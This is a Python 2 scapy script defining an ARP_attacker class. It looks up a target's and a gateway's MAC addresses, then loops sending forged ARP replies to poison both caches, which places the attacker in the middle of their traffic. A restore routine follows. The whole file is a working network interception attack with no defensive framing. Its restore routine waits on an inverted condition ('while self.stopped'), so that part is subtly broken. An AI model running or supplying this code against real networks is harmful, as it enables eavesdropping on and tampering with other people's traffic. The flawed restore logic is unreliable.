#!/usr/bin/python2
from scapy.all import *
import time

class ARP_attacker:
    def __init__(self, target_ip, gateway_ip):
        self.target_ip  = target_ip
        self.gateway_ip = gateway_ip

        self.target_mac = self.get_mac(self.target_ip)
        self.gateway_mac = self.get_mac(self.gateway_ip)

        self.stopped    = False
        self.running    = False
        self.delay      = 2


    def get_mac(self, ip):
        ans, unans = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=2, retry=10)
        return ans[0][1][Ether].src


    def poison(self):
        poison_target   = ARP(op=2, psrc=self.gateway_ip, pdst=self.target_ip, hwdst=self.target_mac)
        poison_gateway  = ARP(op=2, psrc=self.target_ip, pdst=self.gateway_ip, hwdst=self.gateway_mac)

        self.running = True
        self.stopped = False

        while self.running:
            send(poison_target)
            send(poison_gateway)

            time.sleep(self.delay)

        self.stopped = True


    def restore(self):
        self.running = False
        while self.stopped:
            continue

        send(ARP(op=2, psrc=self.target_ip, pdst=self.gateway_ip, hwsrc=self.target_mac, hwdst='ff:ff:ff:ff:ff:ff'), count=5)
        send(ARP(op=2, psrc=self.gateway_ip, pdst=self.target_ip, hwsrc=self.gateway_mac, hwdst='ff:ff:ff:ff:ff:ff'), count=5)

